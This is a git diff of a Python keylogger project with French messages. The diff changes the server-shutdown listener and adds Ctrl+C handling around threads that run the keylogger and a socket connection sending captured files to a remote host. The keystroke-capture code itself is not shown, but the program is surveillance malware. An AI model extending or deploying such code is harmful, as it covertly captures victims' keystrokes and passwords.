@@ -68,17 +68,15 @@ def send_file(client, today):
     client.close()
 
 def server_shutdown_listener(client):
-    while True:
-        try:
-            message = client.recv(1024).decode()
-            if message == "<SERVER_SHUTDOWN>":
-                print("Fermeture du serveur")
-                break
-        except socket.error as e:
-            print(f"Erreur lors de l'écoute de la fermeture : {e}")
-            break
-    client.close()
-    sys.exit()
+    try:
+        message = client.recv(1024).decode()
+        if message == "<SERVER_SHUTDOWN>":
+            print("Fermeture du serveur")
+    except socket.error as e:
+        print(f"Erreur lors de l'écoute de la fermeture : {e}")
+
+    client.close()    
+    sys.exit(0)
 
 def get_active_app():
     app_now = str(gw.getActiveWindow())
@@ -129,11 +127,15 @@ def launch_key_logger():
         listener.join()
 
 if __name__ == '__main__':
-    srv_socket_thread = threading.Thread(target=socket_connection, args=(host, port, today))
-    key_logger_thread = threading.Thread(target=launch_key_logger)
-    
-    key_logger_thread.start()
-    srv_socket_thread.start()
+    try:
+        srv_socket_thread = threading.Thread(target=socket_connection, args=(host, port, today))
+        key_logger_thread = threading.Thread(target=launch_key_logger)
+        
+        key_logger_thread.start()
+        srv_socket_thread.start()
 
-    key_logger_thread.join()
-    srv_socket_thread.join()
+        key_logger_thread.join()
+        srv_socket_thread.join()
+    except KeyboardInterrupt:
+        print("CTRL + C détecté, fermeture du programe")
+        sys.exit(0)
